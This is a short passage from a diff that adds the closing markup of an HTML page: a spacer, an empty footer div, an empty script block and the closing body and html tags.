+
+
+
+          
+          
+          <div style="height: 50px;"></div>
+          
+        
+
+        <div class="site-footer">
+  
+  
+</div>
+
+      </div>
+    </div>
+  </article>
+
+  
+
+<script>
+  
+  
+    
+    
+  
+</script>
+
+  
+
+</body>
+
+</html>
